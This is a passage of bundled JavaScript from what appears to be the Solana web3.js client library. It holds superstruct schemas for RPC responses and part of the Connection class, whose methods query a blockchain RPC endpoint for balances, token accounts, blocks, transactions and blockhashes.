            accounts: superstruct.array(superstruct.number()),
            data: superstruct.string(),
            programIdIndex: superstruct.number()
          })),
          recentBlockhash: superstruct.string(),
          addressTableLookups: superstruct.optional(superstruct.array(AddressTableLookupStruct))
        })
      });
      const ParsedInstructionResult = superstruct.type({
        parsed: superstruct.unknown(),
        program: superstruct.string(),
        programId: PublicKeyFromString
      });
      const RawInstructionResult = superstruct.type({
        accounts: superstruct.array(PublicKeyFromString),
        data: superstruct.string(),
        programId: PublicKeyFromString
      });
      const InstructionResult = superstruct.union([RawInstructionResult, ParsedInstructionResult]);
      const UnknownInstructionResult = superstruct.union([superstruct.type({
        parsed: superstruct.unknown(),
        program: superstruct.string(),
        programId: superstruct.string()
      }), superstruct.type({
        accounts: superstruct.array(superstruct.string()),
        data: superstruct.string(),
        programId: superstruct.string()
      })]);
      const ParsedOrRawInstruction = superstruct.coerce(InstructionResult, UnknownInstructionResult, value => {
        if ('accounts' in value) {
          return superstruct.create(value, RawInstructionResult);
        } else {
          return superstruct.create(value, ParsedInstructionResult);
        }
      });
      const ParsedConfirmedTransactionResult = superstruct.type({
        signatures: superstruct.array(superstruct.string()),
        message: superstruct.type({
          accountKeys: superstruct.array(superstruct.type({
            pubkey: PublicKeyFromString,
            signer: superstruct.boolean(),
            writable: superstruct.boolean(),
            source: superstruct.optional(superstruct.union([superstruct.literal('transaction'), superstruct.literal('lookupTable')]))
          })),
          instructions: superstruct.array(ParsedOrRawInstruction),
          recentBlockhash: superstruct.string(),
          addressTableLookups: superstruct.optional(superstruct.nullable(superstruct.array(AddressTableLookupStruct)))
        })
      });
      const TokenBalanceResult = superstruct.type({
        accountIndex: superstruct.number(),
        mint: superstruct.string(),
        owner: superstruct.optional(superstruct.string()),
        uiTokenAmount: TokenAmountResult
      });
      const LoadedAddressesResult = superstruct.type({
        writable: superstruct.array(PublicKeyFromString),
        readonly: superstruct.array(PublicKeyFromString)
      });
      const ConfirmedTransactionMetaResult = superstruct.type({
        err: TransactionErrorResult,
        fee: superstruct.number(),
        innerInstructions: superstruct.optional(superstruct.nullable(superstruct.array(superstruct.type({
          index: superstruct.number(),
          instructions: superstruct.array(superstruct.type({
            accounts: superstruct.array(superstruct.number()),
            data: superstruct.string(),
            programIdIndex: superstruct.number()
          }))
        })))),
        preBalances: superstruct.array(superstruct.number()),
        postBalances: superstruct.array(superstruct.number()),
        logMessages: superstruct.optional(superstruct.nullable(superstruct.array(superstruct.string()))),
        preTokenBalances: superstruct.optional(superstruct.nullable(superstruct.array(TokenBalanceResult))),
        postTokenBalances: superstruct.optional(superstruct.nullable(superstruct.array(TokenBalanceResult))),
        loadedAddresses: superstruct.optional(LoadedAddressesResult),
        computeUnitsConsumed: superstruct.optional(superstruct.number())
      });
      const ParsedConfirmedTransactionMetaResult = superstruct.type({
        err: TransactionErrorResult,
        fee: superstruct.number(),
        innerInstructions: superstruct.optional(superstruct.nullable(superstruct.array(superstruct.type({
          index: superstruct.number(),
          instructions: superstruct.array(ParsedOrRawInstruction)
        })))),
        preBalances: superstruct.array(superstruct.number()),
        postBalances: superstruct.array(superstruct.number()),
        logMessages: superstruct.optional(superstruct.nullable(superstruct.array(superstruct.string()))),
        preTokenBalances: superstruct.optional(superstruct.nullable(superstruct.array(TokenBalanceResult))),
        postTokenBalances: superstruct.optional(superstruct.nullable(superstruct.array(TokenBalanceResult))),
        loadedAddresses: superstruct.optional(LoadedAddressesResult),
        computeUnitsConsumed: superstruct.optional(superstruct.number())
      });
      const TransactionVersionStruct = superstruct.union([superstruct.literal(0), superstruct.literal('legacy')]);
      const GetBlockRpcResult = jsonRpcResult(superstruct.nullable(superstruct.type({
        blockhash: superstruct.string(),
        previousBlockhash: superstruct.string(),
        parentSlot: superstruct.number(),
        transactions: superstruct.array(superstruct.type({
          transaction: ConfirmedTransactionResult,
          meta: superstruct.nullable(ConfirmedTransactionMetaResult),
          version: superstruct.optional(TransactionVersionStruct)
        })),
        rewards: superstruct.optional(superstruct.array(superstruct.type({
          pubkey: superstruct.string(),
          lamports: superstruct.number(),
          postBalance: superstruct.nullable(superstruct.number()),
          rewardType: superstruct.nullable(superstruct.string())
        }))),
        blockTime: superstruct.nullable(superstruct.number()),
        blockHeight: superstruct.nullable(superstruct.number())
      })));
      const GetParsedBlockRpcResult = jsonRpcResult(superstruct.nullable(superstruct.type({
        blockhash: superstruct.string(),
        previousBlockhash: superstruct.string(),
        parentSlot: superstruct.number(),
        transactions: superstruct.array(superstruct.type({
          transaction: ParsedConfirmedTransactionResult,
          meta: superstruct.nullable(ParsedConfirmedTransactionMetaResult),
          version: superstruct.optional(TransactionVersionStruct)
        })),
        rewards: superstruct.optional(superstruct.array(superstruct.type({
          pubkey: superstruct.string(),
          lamports: superstruct.number(),
          postBalance: superstruct.nullable(superstruct.number()),
          rewardType: superstruct.nullable(superstruct.string())
        }))),
        blockTime: superstruct.nullable(superstruct.number()),
        blockHeight: superstruct.nullable(superstruct.number())
      })));
      const GetConfirmedBlockRpcResult = jsonRpcResult(superstruct.nullable(superstruct.type({
        blockhash: superstruct.string(),
        previousBlockhash: superstruct.string(),
        parentSlot: superstruct.number(),
        transactions: superstruct.array(superstruct.type({
          transaction: ConfirmedTransactionResult,
          meta: superstruct.nullable(ConfirmedTransactionMetaResult)
        })),
        rewards: superstruct.optional(superstruct.array(superstruct.type({
          pubkey: superstruct.string(),
          lamports: superstruct.number(),
          postBalance: superstruct.nullable(superstruct.number()),
          rewardType: superstruct.nullable(superstruct.string())
        }))),
        blockTime: superstruct.nullable(superstruct.number())
      })));
      const GetBlockSignaturesRpcResult = jsonRpcResult(superstruct.nullable(superstruct.type({
        blockhash: superstruct.string(),
        previousBlockhash: superstruct.string(),
        parentSlot: superstruct.number(),
        signatures: superstruct.array(superstruct.string()),
        blockTime: superstruct.nullable(superstruct.number())
      })));
      const GetTransactionRpcResult = jsonRpcResult(superstruct.nullable(superstruct.type({
        slot: superstruct.number(),
        meta: ConfirmedTransactionMetaResult,
        blockTime: superstruct.optional(superstruct.nullable(superstruct.number())),
        transaction: ConfirmedTransactionResult,
        version: superstruct.optional(TransactionVersionStruct)
      })));
      const GetParsedTransactionRpcResult = jsonRpcResult(superstruct.nullable(superstruct.type({
        slot: superstruct.number(),
        transaction: ParsedConfirmedTransactionResult,
        meta: superstruct.nullable(ParsedConfirmedTransactionMetaResult),
        blockTime: superstruct.optional(superstruct.nullable(superstruct.number())),
        version: superstruct.optional(TransactionVersionStruct)
      })));
      const GetRecentBlockhashAndContextRpcResult = jsonRpcResultAndContext(superstruct.type({
        blockhash: superstruct.string(),
        feeCalculator: superstruct.type({
          lamportsPerSignature: superstruct.number()
        })
      }));
      const GetLatestBlockhashRpcResult = jsonRpcResultAndContext(superstruct.type({
        blockhash: superstruct.string(),
        lastValidBlockHeight: superstruct.number()
      }));
      const PerfSampleResult = superstruct.type({
        slot: superstruct.number(),
        numTransactions: superstruct.number(),
        numSlots: superstruct.number(),
        samplePeriodSecs: superstruct.number()
      });
      const GetRecentPerformanceSamplesRpcResult = jsonRpcResult(superstruct.array(PerfSampleResult));
      const GetFeeCalculatorRpcResult = jsonRpcResultAndContext(superstruct.nullable(superstruct.type({
        feeCalculator: superstruct.type({
          lamportsPerSignature: superstruct.number()
        })
      })));
      const RequestAirdropRpcResult = jsonRpcResult(superstruct.string());
      const SendTransactionRpcResult = jsonRpcResult(superstruct.string());
      const LogsResult = superstruct.type({
        err: TransactionErrorResult,
        logs: superstruct.array(superstruct.string()),
        signature: superstruct.string()
      });
      const LogsNotificationResult = superstruct.type({
        result: notificationResultAndContext(LogsResult),
        subscription: superstruct.number()
      });
      const COMMON_HTTP_HEADERS = {
        'solana-client': `js/${(_process$env$npm_pack = "0.0.0-development") !== null && _process$env$npm_pack !== void 0 ? _process$env$npm_pack : 'UNKNOWN'}`
      };
      class Connection {
        constructor(endpoint, commitmentOrConfig) {
          this._commitment = void 0;
          this._confirmTransactionInitialTimeout = void 0;
          this._rpcEndpoint = void 0;
          this._rpcWsEndpoint = void 0;
          this._rpcClient = void 0;
          this._rpcRequest = void 0;
          this._rpcBatchRequest = void 0;
          this._rpcWebSocket = void 0;
          this._rpcWebSocketConnected = false;
          this._rpcWebSocketHeartbeat = null;
          this._rpcWebSocketIdleTimeout = null;
          this._rpcWebSocketGeneration = 0;
          this._disableBlockhashCaching = false;
          this._pollingBlockhash = false;
          this._blockhashInfo = {
            latestBlockhash: null,
            lastFetch: 0,
            transactionSignatures: [],
            simulatedSignatures: []
          };
          this._nextClientSubscriptionId = 0;
          this._subscriptionDisposeFunctionsByClientSubscriptionId = {};
          this._subscriptionCallbacksByServerSubscriptionId = {};
          this._subscriptionsByHash = {};
          this._subscriptionsAutoDisposedByRpc = new Set();
          let wsEndpoint;
          let httpHeaders;
          let fetch;
          let fetchMiddleware;
          let disableRetryOnRateLimit;
          if (commitmentOrConfig && typeof commitmentOrConfig === 'string') {
            this._commitment = commitmentOrConfig;
          } else if (commitmentOrConfig) {
            this._commitment = commitmentOrConfig.commitment;
            this._confirmTransactionInitialTimeout = commitmentOrConfig.confirmTransactionInitialTimeout;
            wsEndpoint = commitmentOrConfig.wsEndpoint;
            httpHeaders = commitmentOrConfig.httpHeaders;
            fetch = commitmentOrConfig.fetch;
            fetchMiddleware = commitmentOrConfig.fetchMiddleware;
            disableRetryOnRateLimit = commitmentOrConfig.disableRetryOnRateLimit;
          }
          this._rpcEndpoint = assertEndpointUrl(endpoint);
          this._rpcWsEndpoint = wsEndpoint || makeWebsocketUrl(endpoint);
          this._rpcClient = createRpcClient(endpoint, httpHeaders, fetch, fetchMiddleware, disableRetryOnRateLimit);
          this._rpcRequest = createRpcRequest(this._rpcClient);
          this._rpcBatchRequest = createRpcBatchRequest(this._rpcClient);
          this._rpcWebSocket = new rpcWebsockets.Client(this._rpcWsEndpoint, {
            autoconnect: false,
            max_reconnects: Infinity
          });
          this._rpcWebSocket.on('open', this._wsOnOpen.bind(this));
          this._rpcWebSocket.on('error', this._wsOnError.bind(this));
          this._rpcWebSocket.on('close', this._wsOnClose.bind(this));
          this._rpcWebSocket.on('accountNotification', this._wsOnAccountNotification.bind(this));
          this._rpcWebSocket.on('programNotification', this._wsOnProgramAccountNotification.bind(this));
          this._rpcWebSocket.on('slotNotification', this._wsOnSlotNotification.bind(this));
          this._rpcWebSocket.on('slotsUpdatesNotification', this._wsOnSlotUpdatesNotification.bind(this));
          this._rpcWebSocket.on('signatureNotification', this._wsOnSignatureNotification.bind(this));
          this._rpcWebSocket.on('rootNotification', this._wsOnRootNotification.bind(this));
          this._rpcWebSocket.on('logsNotification', this._wsOnLogsNotification.bind(this));
        }
        get commitment() {
          return this._commitment;
        }
        get rpcEndpoint() {
          return this._rpcEndpoint;
        }
        async getBalanceAndContext(publicKey, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([publicKey.toBase58()], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getBalance', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.number()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get balance for ${publicKey.toBase58()}`);
          }
          return res.result;
        }
        async getBalance(publicKey, commitmentOrConfig) {
          return await this.getBalanceAndContext(publicKey, commitmentOrConfig).then(x => x.value).catch(e => {
            throw new Error('failed to get balance of account ' + publicKey.toBase58() + ': ' + e);
          });
        }
        async getBlockTime(slot) {
          const unsafeRes = await this._rpcRequest('getBlockTime', [slot]);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.nullable(superstruct.number())));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get block time for slot ${slot}`);
          }
          return res.result;
        }
        async getMinimumLedgerSlot() {
          const unsafeRes = await this._rpcRequest('minimumLedgerSlot', []);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.number()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get minimum ledger slot');
          }
          return res.result;
        }
        async getFirstAvailableBlock() {
          const unsafeRes = await this._rpcRequest('getFirstAvailableBlock', []);
          const res = superstruct.create(unsafeRes, SlotRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get first available block');
          }
          return res.result;
        }
        async getSupply(config) {
          let configArg = {};
          if (typeof config === 'string') {
            configArg = {
              commitment: config
            };
          } else if (config) {
            configArg = {
              ...config,
              commitment: config && config.commitment || this.commitment
            };
          } else {
            configArg = {
              commitment: this.commitment
            };
          }
          const unsafeRes = await this._rpcRequest('getSupply', [configArg]);
          const res = superstruct.create(unsafeRes, GetSupplyRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get supply');
          }
          return res.result;
        }
        async getTokenSupply(tokenMintAddress, commitment) {
          const args = this._buildArgs([tokenMintAddress.toBase58()], commitment);
          const unsafeRes = await this._rpcRequest('getTokenSupply', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(TokenAmountResult));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get token supply');
          }
          return res.result;
        }
        async getTokenAccountBalance(tokenAddress, commitment) {
          const args = this._buildArgs([tokenAddress.toBase58()], commitment);
          const unsafeRes = await this._rpcRequest('getTokenAccountBalance', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(TokenAmountResult));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get token account balance');
          }
          return res.result;
        }
        async getTokenAccountsByOwner(ownerAddress, filter, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          let _args = [ownerAddress.toBase58()];
          if ('mint' in filter) {
            _args.push({
              mint: filter.mint.toBase58()
            });
          } else {
            _args.push({
              programId: filter.programId.toBase58()
            });
          }
          const args = this._buildArgs(_args, commitment, 'base64', config);
          const unsafeRes = await this._rpcRequest('getTokenAccountsByOwner', args);
          const res = superstruct.create(unsafeRes, GetTokenAccountsByOwner);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get token accounts owned by account ${ownerAddress.toBase58()}`);
          }
          return res.result;
        }
        async getParsedTokenAccountsByOwner(ownerAddress, filter, commitment) {
          let _args = [ownerAddress.toBase58()];
          if ('mint' in filter) {
            _args.push({
              mint: filter.mint.toBase58()
            });
          } else {
            _args.push({
              programId: filter.programId.toBase58()
            });
          }
          const args = this._buildArgs(_args, commitment, 'jsonParsed');
          const unsafeRes = await this._rpcRequest('getTokenAccountsByOwner', args);
          const res = superstruct.create(unsafeRes, GetParsedTokenAccountsByOwner);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get token accounts owned by account ${ownerAddress.toBase58()}`);
          }
          return res.result;
        }
        async getLargestAccounts(config) {
          const arg = {
            ...config,
            commitment: config && config.commitment || this.commitment
          };
          const args = arg.filter || arg.commitment ? [arg] : [];
          const unsafeRes = await this._rpcRequest('getLargestAccounts', args);
          const res = superstruct.create(unsafeRes, GetLargestAccountsRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get largest accounts');
          }
          return res.result;
        }
        async getTokenLargestAccounts(mintAddress, commitment) {
          const args = this._buildArgs([mintAddress.toBase58()], commitment);
          const unsafeRes = await this._rpcRequest('getTokenLargestAccounts', args);
          const res = superstruct.create(unsafeRes, GetTokenLargestAccountsResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get token largest accounts');
          }
          return res.result;
        }
        async getAccountInfoAndContext(publicKey, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([publicKey.toBase58()], commitment, 'base64', config);
          const unsafeRes = await this._rpcRequest('getAccountInfo', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.nullable(AccountInfoResult)));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get info about account ${publicKey.toBase58()}`);
          }
          return res.result;
        }
        async getParsedAccountInfo(publicKey, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([publicKey.toBase58()], commitment, 'jsonParsed', config);
          const unsafeRes = await this._rpcRequest('getAccountInfo', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.nullable(ParsedAccountInfoResult)));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get info about account ${publicKey.toBase58()}`);
          }
          return res.result;
        }
        async getAccountInfo(publicKey, commitmentOrConfig) {
          try {
            const res = await this.getAccountInfoAndContext(publicKey, commitmentOrConfig);
            return res.value;
          } catch (e) {
            throw new Error('failed to get info about account ' + publicKey.toBase58() + ': ' + e);
          }
        }
        async getMultipleParsedAccounts(publicKeys, rawConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(rawConfig);
          const keys = publicKeys.map(key => key.toBase58());
          const args = this._buildArgs([keys], commitment, 'jsonParsed', config);
          const unsafeRes = await this._rpcRequest('getMultipleAccounts', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.array(superstruct.nullable(ParsedAccountInfoResult))));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get info for accounts ${keys}`);
          }
          return res.result;
        }
        async getMultipleAccountsInfoAndContext(publicKeys, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const keys = publicKeys.map(key => key.toBase58());
          const args = this._buildArgs([keys], commitment, 'base64', config);
          const unsafeRes = await this._rpcRequest('getMultipleAccounts', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.array(superstruct.nullable(AccountInfoResult))));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get info for accounts ${keys}`);
          }
          return res.result;
        }
        async getMultipleAccountsInfo(publicKeys, commitmentOrConfig) {
          const res = await this.getMultipleAccountsInfoAndContext(publicKeys, commitmentOrConfig);
          return res.value;
        }
        async getStakeActivation(publicKey, commitmentOrConfig, epoch) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([publicKey.toBase58()], commitment, undefined, {
            ...config,
            epoch: epoch != null ? epoch : config === null || config === void 0 ? void 0 : config.epoch
          });
          const unsafeRes = await this._rpcRequest('getStakeActivation', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(StakeActivationResult));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get Stake Activation ${publicKey.toBase58()}`);
          }
          return res.result;
        }
        async getProgramAccounts(programId, configOrCommitment) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(configOrCommitment);
          const {
            encoding,
            ...configWithoutEncoding
          } = config || {};
          const args = this._buildArgs([programId.toBase58()], commitment, encoding || 'base64', configWithoutEncoding);
          const unsafeRes = await this._rpcRequest('getProgramAccounts', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.array(KeyedAccountInfoResult)));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get accounts owned by program ${programId.toBase58()}`);
          }
          return res.result;
        }
        async getParsedProgramAccounts(programId, configOrCommitment) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(configOrCommitment);
          const args = this._buildArgs([programId.toBase58()], commitment, 'jsonParsed', config);
          const unsafeRes = await this._rpcRequest('getProgramAccounts', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.array(KeyedParsedAccountInfoResult)));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get accounts owned by program ${programId.toBase58()}`);
          }
          return res.result;
        }
        async confirmTransaction(strategy, commitment) {
          let rawSignature;
          if (typeof strategy == 'string') {
            rawSignature = strategy;
          } else {
            const config = strategy;
            rawSignature = config.signature;
          }
          let decodedSignature;
          try {
            decodedSignature = bs58__default["default"].decode(rawSignature);
          } catch (err) {
            throw new Error('signature must be base58 encoded: ' + rawSignature);
          }
          assert(decodedSignature.length === 64, 'signature has invalid length');
          const subscriptionCommitment = commitment || this.commitment;
          let timeoutId;
          let subscriptionId;
          let done = false;
          const confirmationPromise = new Promise((resolve, reject) => {
            try {
              subscriptionId = this.onSignature(rawSignature, (result, context) => {
                subscriptionId = undefined;
                const response = {
                  context,
                  value: result
                };
                done = true;
                resolve({
                  __type: exports.TransactionStatus.PROCESSED,
                  response
                });
              }, subscriptionCommitment);
            } catch (err) {
              reject(err);
            }
          });
          const expiryPromise = new Promise(resolve => {
            if (typeof strategy === 'string') {
              let timeoutMs = this._confirmTransactionInitialTimeout || 60 * 1000;
              switch (subscriptionCommitment) {
                case 'processed':
                case 'recent':
                case 'single':
                case 'confirmed':
                case 'singleGossip':
                  {
                    timeoutMs = this._confirmTransactionInitialTimeout || 30 * 1000;
                    break;
                  }
              }
              timeoutId = setTimeout(() => resolve({
                __type: exports.TransactionStatus.TIMED_OUT,
                timeoutMs
              }), timeoutMs);
            } else {
              let config = strategy;
              const checkBlockHeight = async () => {
                try {
                  const blockHeight = await this.getBlockHeight(commitment);
                  return blockHeight;
                } catch (_e) {
                  return -1;
                }
              };
              (async () => {
                let currentBlockHeight = await checkBlockHeight();
                if (done) return;
                while (currentBlockHeight <= config.lastValidBlockHeight) {
                  await sleep(1000);
                  if (done) return;
                  currentBlockHeight = await checkBlockHeight();
                  if (done) return;
                }
                resolve({
                  __type: exports.TransactionStatus.BLOCKHEIGHT_EXCEEDED
                });
              })();
            }
          });
          let result;
          try {
            const outcome = await Promise.race([confirmationPromise, expiryPromise]);
            switch (outcome.__type) {
              case exports.TransactionStatus.BLOCKHEIGHT_EXCEEDED:
                throw new TransactionExpiredBlockheightExceededError(rawSignature);
              case exports.TransactionStatus.PROCESSED:
                result = outcome.response;
                break;
              case exports.TransactionStatus.TIMED_OUT:
                throw new TransactionExpiredTimeoutError(rawSignature, outcome.timeoutMs / 1000);
            }
          } finally {
            clearTimeout(timeoutId);
            if (subscriptionId) {
              this.removeSignatureListener(subscriptionId);
            }
          }
          return result;
        }
        async getClusterNodes() {
          const unsafeRes = await this._rpcRequest('getClusterNodes', []);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.array(ContactInfoResult)));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get cluster nodes');
          }
          return res.result;
        }
        async getVoteAccounts(commitment) {
          const args = this._buildArgs([], commitment);
          const unsafeRes = await this._rpcRequest('getVoteAccounts', args);
          const res = superstruct.create(unsafeRes, GetVoteAccounts);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get vote accounts');
          }
          return res.result;
        }
        async getSlot(commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getSlot', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.number()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get slot');
          }
          return res.result;
        }
        async getSlotLeader(commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getSlotLeader', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.string()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get slot leader');
          }
          return res.result;
        }
        async getSlotLeaders(startSlot, limit) {
          const args = [startSlot, limit];
          const unsafeRes = await this._rpcRequest('getSlotLeaders', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.array(PublicKeyFromString)));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get slot leaders');
          }
          return res.result;
        }
        async getSignatureStatus(signature, config) {
          const {
            context,
            value: values
          } = await this.getSignatureStatuses([signature], config);
          assert(values.length === 1);
          const value = values[0];
          return {
            context,
            value
          };
        }
        async getSignatureStatuses(signatures, config) {
          const params = [signatures];
          if (config) {
            params.push(config);
          }
          const unsafeRes = await this._rpcRequest('getSignatureStatuses', params);
          const res = superstruct.create(unsafeRes, GetSignatureStatusesRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get signature status');
          }
          return res.result;
        }
        async getTransactionCount(commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getTransactionCount', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.number()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get transaction count');
          }
          return res.result;
        }
        async getTotalSupply(commitment) {
          const result = await this.getSupply({
            commitment,
            excludeNonCirculatingAccountsList: true
          });
          return result.value.total;
        }
        async getInflationGovernor(commitment) {
          const args = this._buildArgs([], commitment);
          const unsafeRes = await this._rpcRequest('getInflationGovernor', args);
          const res = superstruct.create(unsafeRes, GetInflationGovernorRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get inflation');
          }
          return res.result;
        }
        async getInflationReward(addresses, epoch, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([addresses.map(pubkey => pubkey.toBase58())], commitment, undefined, {
            ...config,
            epoch: epoch != null ? epoch : config === null || config === void 0 ? void 0 : config.epoch
          });
          const unsafeRes = await this._rpcRequest('getInflationReward', args);
          const res = superstruct.create(unsafeRes, GetInflationRewardResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get inflation reward');
          }
          return res.result;
        }
        async getEpochInfo(commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getEpochInfo', args);
          const res = superstruct.create(unsafeRes, GetEpochInfoRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get epoch info');
          }
          return res.result;
        }
        async getEpochSchedule() {
          const unsafeRes = await this._rpcRequest('getEpochSchedule', []);
          const res = superstruct.create(unsafeRes, GetEpochScheduleRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get epoch schedule');
          }
          const epochSchedule = res.result;
          return new EpochSchedule(epochSchedule.slotsPerEpoch, epochSchedule.leaderScheduleSlotOffset, epochSchedule.warmup, epochSchedule.firstNormalEpoch, epochSchedule.firstNormalSlot);
        }
        async getLeaderSchedule() {
          const unsafeRes = await this._rpcRequest('getLeaderSchedule', []);
          const res = superstruct.create(unsafeRes, GetLeaderScheduleRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get leader schedule');
          }
          return res.result;
        }
        async getMinimumBalanceForRentExemption(dataLength, commitment) {
          const args = this._buildArgs([dataLength], commitment);
          const unsafeRes = await this._rpcRequest('getMinimumBalanceForRentExemption', args);
          const res = superstruct.create(unsafeRes, GetMinimumBalanceForRentExemptionRpcResult);
          if ('error' in res) {
            console.warn('Unable to fetch minimum balance for rent exemption');
            return 0;
          }
          return res.result;
        }
        async getRecentBlockhashAndContext(commitment) {
          const args = this._buildArgs([], commitment);
          const unsafeRes = await this._rpcRequest('getRecentBlockhash', args);
          const res = superstruct.create(unsafeRes, GetRecentBlockhashAndContextRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get recent blockhash');
          }
          return res.result;
        }
        async getRecentPerformanceSamples(limit) {
          const unsafeRes = await this._rpcRequest('getRecentPerformanceSamples', limit ? [limit] : []);
          const res = superstruct.create(unsafeRes, GetRecentPerformanceSamplesRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get recent performance samples');
          }
          return res.result;
        }
        async getFeeCalculatorForBlockhash(blockhash, commitment) {
          const args = this._buildArgs([blockhash], commitment);
          const unsafeRes = await this._rpcRequest('getFeeCalculatorForBlockhash', args);
          const res = superstruct.create(unsafeRes, GetFeeCalculatorRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get fee calculator');
          }
          const {
            context,
            value
          } = res.result;
          return {
            context,
            value: value !== null ? value.feeCalculator : null
          };
        }
        async getFeeForMessage(message, commitment) {
          const wireMessage = message.serialize().toString('base64');
          const args = this._buildArgs([wireMessage], commitment);
          const unsafeRes = await this._rpcRequest('getFeeForMessage', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.nullable(superstruct.number())));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get fee for message');
          }
          if (res.result === null) {
            throw new Error('invalid blockhash');
          }
          return res.result;
        }
        async getRecentBlockhash(commitment) {
          try {
            const res = await this.getRecentBlockhashAndContext(commitment);
            return res.value;
          } catch (e) {
            throw new Error('failed to get recent blockhash: ' + e);
          }
        }
        async getLatestBlockhash(commitmentOrConfig) {
          try {
            const res = await this.getLatestBlockhashAndContext(commitmentOrConfig);
            return res.value;
          } catch (e) {
            throw new Error('failed to get recent blockhash: ' + e);
          }
        }
        async getLatestBlockhashAndContext(commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getLatestBlockhash', args);
          const res = superstruct.create(unsafeRes, GetLatestBlockhashRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get latest blockhash');
          }
          return res.result;
        }
        async getVersion() {
